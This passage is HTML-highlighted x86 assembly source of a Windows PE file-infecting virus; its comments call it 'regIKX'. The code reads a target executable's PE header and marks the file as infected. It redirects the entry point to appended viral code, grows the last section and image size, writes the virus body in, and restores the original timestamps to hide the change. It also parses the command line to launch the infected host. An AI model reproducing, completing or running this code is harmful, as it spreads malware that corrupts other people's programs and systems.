        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">GetTime</span><span class="sc4">,[</span><span class="sc5">fHandle</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">crTime</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">laTime</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">lwTime</span><span class="sc0">
 
        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Read</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">                  \
                </span><span class="sc4">[</span><span class="sc5">fHandle</span><span class="sc4">],</span><span class="sc0">              \ </span><span class="sc1">;handle</span><span class="sc0">
                </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">fBuff</span><span class="sc4">,</span><span class="sc0">           \ </span><span class="sc1">;where to read to</span><span class="sc0">
                </span><span class="sc2">400h</span><span class="sc4">,</span><span class="sc0">                   \ </span><span class="sc1">;how much to read</span><span class="sc0">
                </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Temp</span><span class="sc4">,</span><span class="sc0">            \ </span><span class="sc1">;how much was read</span><span class="sc0">
                </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                   </span><span class="sc1">;overlapped amount not used win95</span><span class="sc0">


        </span><span class="sc6">Or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;Check if All is ok</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@ErrorFileOpenErr</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Temp</span><span class="sc4">],</span><span class="sc2">400h</span><span class="sc0">   </span><span class="sc1">;Did we read all We wanted to</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">@@ErrorFileOpenErr</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">Esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fBuff</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">NEptr</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;Get the ptr to the PE</span><span class="sc0">
        </span><span class="sc6">lodsd</span><span class="sc0">                           </span><span class="sc1">;It would probaly be safer to</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">Eax</span><span class="sc4">,</span><span class="sc8">Eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">@@ErrorFileOpenErr</span><span class="sc0">      </span><span class="sc1">;Not a PE</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">Eax</span><span class="sc4">,</span><span class="sc2">1a0h</span><span class="sc0">                </span><span class="sc1">;If greater than this then avg</span><span class="sc0">
        </span><span class="sc6">jg</span><span class="sc0">      </span><span class="sc5">@@ErrorFileOpenErr</span><span class="sc0">      </span><span class="sc1">;PE hdr would not fit in remaining</span><span class="sc0">
                                        </span><span class="sc1">;space so quit</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">fBuff</span><span class="sc0">        </span><span class="sc1">;check for MZ as well</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">Esi</span><span class="sc4">,</span><span class="sc8">Eax</span><span class="sc0">                 </span><span class="sc1">;feel free to add that Check </span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">],</span><span class="sc3">"EP"</span><span class="sc0">     </span><span class="sc1">;if you Like</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">@@ErrorFileOpenErr</span><span class="sc0">

        </span><span class="sc1">;Next check to see if we have the Section Entry for the</span><span class="sc0">
        </span><span class="sc1">;last Section </span><span class="sc0">
        </span><span class="sc1">;ESI pnts to the PE offset</span><span class="sc0">
         
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0">  </span><span class="sc5">NumOfSect</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cwde</span><span class="sc0">                                    </span><span class="sc1">;Convert ax to Eax</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">Eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">Ecx</span><span class="sc4">,</span><span class="sc5">SectHdrSze</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">Ecx</span><span class="sc0">

        </span><span class="sc6">Add</span><span class="sc0">     </span><span class="sc8">Eax</span><span class="sc4">,</span><span class="sc5">PEHdrSze</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">Eax</span><span class="sc4">,</span><span class="sc2">400h</span><span class="sc0">
        </span><span class="sc6">jg</span><span class="sc0">      </span><span class="sc5">@@ErrorFileOpenErr</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">Eax</span><span class="sc4">,</span><span class="sc8">Esi</span><span class="sc0">         </span><span class="sc1">;Edi = offset to the LastSection</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">Edi</span><span class="sc4">,</span><span class="sc8">Eax</span><span class="sc0">
        

        </span><span class="sc1">;Now need to modify this last section</span><span class="sc0">
        </span><span class="sc1">;Will Need to get FileSize as well....</span><span class="sc0">

        </span><span class="sc1">;Debug just to see last section name if ".?????" infect</span><span class="sc0">
        </span><span class="sc1">;if " ??????" already infected</span><span class="sc0">
        </span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">Eax</span><span class="sc0"> 
                </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">msgbox</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc8">Edi</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc8">Edi</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc10">Large</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">Eax</span><span class="sc0">
        </span><span class="sc9">ENDIF</span><span class="sc0">

        </span><span class="sc1">;check For Infection</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Edi</span><span class="sc4">]</span><span class="sc0">                       
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">                  </span><span class="sc1">;check for space as first char</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">@@InfectedAlready</span><span class="sc0">

        </span><span class="sc1">;Otherwise assume we will infect</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Edi</span><span class="sc4">],</span><span class="sc2">20h</span><span class="sc0">
        
        </span><span class="sc1">;Get Eip and move it to the return area</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">Ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">EipOff</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">RegHook</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">Ebx</span><span class="sc0">

        </span><span class="sc1">;Set New Eip</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">Ebx</span><span class="sc4">,[</span><span class="sc8">Edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SectRawSze</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;Get New Eip</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">Ebx</span><span class="sc4">,[</span><span class="sc8">Edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SectVadd</span><span class="sc4">]</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">Ebx</span><span class="sc4">,</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">RegHook</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc0">    </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">Esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">EipOff</span><span class="sc4">],</span><span class="sc8">Ebx</span><span class="sc0">                      </span><span class="sc1">;Store It</span><span class="sc0">

        </span><span class="sc1">;Setup How where we are adding all the code</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SectRawSze</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">Add</span><span class="sc0">     </span><span class="sc8">Eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">Edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SectPtrRaw</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">PtrAddNew</span><span class="sc4">],</span><span class="sc8">Eax</span><span class="sc0">

        </span><span class="sc1">;Now We need to modify the last Section entry to</span><span class="sc0">
        </span><span class="sc1">;hold the new code</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">Edx</span><span class="sc4">,</span><span class="sc8">Edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">Eax</span><span class="sc4">,</span><span class="sc5">VSize</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">Eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SectRawSze</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">Eax</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">Edx</span><span class="sc4">,</span><span class="sc8">Edx</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">@@ErrorFileOpenErr</span><span class="sc0">

        </span><span class="sc1">;Update Section Raw Data Size</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">Ecx</span><span class="sc4">,[</span><span class="sc8">Esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FileAlign</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">Eax</span><span class="sc4">,</span><span class="sc8">Ecx</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">Eax</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">Ecx</span><span class="sc0">
        </span><span class="sc6">Mul</span><span class="sc0">     </span><span class="sc8">Ecx</span><span class="sc0">

        </span><span class="sc1">;Save how much we will add to the file</span><span class="sc0">
        </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Eax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">Eax</span><span class="sc4">,[</span><span class="sc8">Edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SectRawSze</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">AddSize</span><span class="sc4">],</span><span class="sc8">Eax</span><span class="sc0">
        </span><span class="sc6">Pop</span><span class="sc0">     </span><span class="sc8">Eax</span><span class="sc0">

        </span><span class="sc1">;save the new raw data size of the section</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">Edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SectRawSze</span><span class="sc4">],</span><span class="sc8">Eax</span><span class="sc0">

        </span><span class="sc1">;Using the new Raw Data Size update</span><span class="sc0">
        </span><span class="sc1">;the Section virtual Size</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">Ecx</span><span class="sc4">,[</span><span class="sc8">Esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SectAlign</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">Eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">Eax</span><span class="sc4">,</span><span class="sc8">Ecx</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">Ecx</span><span class="sc0">
        </span><span class="sc6">Mul</span><span class="sc0">     </span><span class="sc8">Ecx</span><span class="sc0">

        </span><span class="sc1">;while here lets update the ImageSze as well</span><span class="sc0">
        </span><span class="sc1">;since some progs do not use a correct val in Vsize</span><span class="sc0">
        </span><span class="sc1">;we make sure that our value is at least on a section alignment</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">Eax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">Eax</span><span class="sc4">,[</span><span class="sc8">Edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SectVsze</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">Eax</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">Ecx</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">Esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ImageSze</span><span class="sc4">],</span><span class="sc8">Eax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">Eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">Edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SectVsze</span><span class="sc4">],</span><span class="sc8">Eax</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">Edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">SectChar</span><span class="sc4">],</span><span class="sc2">80000000h</span><span class="sc0">

        </span><span class="sc1">;Now move the file ptr to the new size</span><span class="sc0">
        </span><span class="sc1">;write this to the file</span><span class="sc0">
        </span><span class="sc1">;Goto the start of the file and write the new Header</span><span class="sc0">
        </span><span class="sc1">;close the file</span><span class="sc0">

        </span><span class="sc1">;Set the ptr to the place where the old info ended</span><span class="sc0">
        </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileP</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fHandle</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">PtrAddNew</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc1">;Write to the file using Write</span><span class="sc0">
                </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Write</span><span class="sc4">],</span><span class="sc0">              \</span><span class="sc1">;</span><span class="sc0">
                                </span><span class="sc4">[</span><span class="sc5">fHandle</span><span class="sc4">],</span><span class="sc0">              \</span><span class="sc1">;handle</span><span class="sc0">
                                </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc4">,</span><span class="sc0">        \</span><span class="sc1">;write from</span><span class="sc0">
                                </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">AddSize</span><span class="sc4">],</span><span class="sc0">    \</span><span class="sc1">;size </span><span class="sc0">
                                </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Temp</span><span class="sc4">,</span><span class="sc0">            \</span><span class="sc1">;how much written</span><span class="sc0">
                                </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">

        
        </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileP</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fHandle</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc1">;Write to the file using Write</span><span class="sc0">
                </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Write</span><span class="sc4">],</span><span class="sc0">              \</span><span class="sc1">;</span><span class="sc0">
                                </span><span class="sc4">[</span><span class="sc5">fHandle</span><span class="sc4">],</span><span class="sc0">              \</span><span class="sc1">;handle</span><span class="sc0">
                                </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">fBuff</span><span class="sc4">,</span><span class="sc0">        \</span><span class="sc1">;write from</span><span class="sc0">
                                </span><span class="sc2">0400h</span><span class="sc4">,</span><span class="sc0">    \</span><span class="sc1">;size </span><span class="sc0">
                                </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Temp</span><span class="sc4">,</span><span class="sc0">            \</span><span class="sc1">;how much written</span><span class="sc0">
                                </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">SetTime</span><span class="sc4">,[</span><span class="sc5">fHandle</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">crTime</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">laTime</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">lwTime</span><span class="sc0">
 


</span><span class="sc5">@@InfectedAlready</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">@@ErrorFileOpenErr</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Close the file</span><span class="sc0">

                </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">Close</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fHandle</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">@@FileNotOpenErr</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">PopA</span><span class="sc0">
                </span><span class="sc6">Ret</span><span class="sc0">
                </span><span class="sc9">EndP</span><span class="sc0">
</span><span class="sc1">;------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">FillFileNames</span><span class="sc0">   </span><span class="sc9">PROC</span><span class="sc0">
  

        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">getcomline</span><span class="sc0">
        </span><span class="sc1">;returns EAX = CommandLine</span><span class="sc0">

  
</span><span class="sc1">;Due to the way this virus will "hook" the registery it should always</span><span class="sc0">
</span><span class="sc1">;recieve "regIKX.exe" Host.exe args</span><span class="sc0">
</span><span class="sc1">;So to find the File we look for .exe</span><span class="sc0">
</span><span class="sc1">;first move the exe name to the FileNAme</span><span class="sc0">
</span><span class="sc1">;then Move the Entire line to the EXEcName</span><span class="sc0">

        </span><span class="sc1">;move Eax to the command args</span><span class="sc0">

</span><span class="sc5">@@Next1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">Eax</span><span class="sc0">                     </span><span class="sc1">;Get past first "</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Eax</span><span class="sc4">],</span><span class="sc12">'.'</span><span class="sc0">      </span><span class="sc1">;Find Next</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">@@Next1</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;ebx = "EXE."</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc2">0DFDFDFFFH</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc3">"EXE."</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">@@Next1</span><span class="sc0">

 
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">Eax</span><span class="sc0">     </span><span class="sc1">;.</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">Eax</span><span class="sc0">     </span><span class="sc1">;E</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">Eax</span><span class="sc0">     </span><span class="sc1">;X</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">Eax</span><span class="sc0">     </span><span class="sc1">;E      ;At this point we should be looking at the</span><span class="sc0">
                                </span><span class="sc1">;Next file we have to run and potential</span><span class="sc0">
                                </span><span class="sc1">;any command line paremters to that file</span><span class="sc0">
 
 
</span><span class="sc5">@@Next2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Eax</span><span class="sc4">],</span><span class="sc12">'"'</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">@@skip</span><span class="sc0">
        </span><span class="sc6">Inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">@@skip</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Eax</span><span class="sc4">],</span><span class="sc3">" "</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">@@Space</span><span class="sc0">                   </span><span class="sc1">;we have command line info</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Eax</span><span class="sc4">],</span><span class="sc2">00</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">@@NoCommandLine</span><span class="sc0">

</span><span class="sc5">@@Space</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">;Load the  FileName and EXEcName</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FileName</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">@@RemoveSpace</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc3">" "</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">@@NextNameByte</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@RemoveSpace</span><span class="sc0">

</span><span class="sc5">@@NextNameByte</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc3">"."</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">@@a1</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">   
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">@@NoFileToExec</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@Cn1</span><span class="sc0">
</span><span class="sc5">@@a1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">Ebx</span><span class="sc4">,</span><span class="sc10">Dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc0"> </span><span class="sc8">Esi</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc2">0DFDFDFFFH</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc3">"EXE."</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">@@Cn1</span><span class="sc0"> 
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">Edi</span><span class="sc4">],</span><span class="sc8">Ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">Edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">256d</span><span class="sc4">],</span><span class="sc8">Ebx</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">Esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">Esi</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
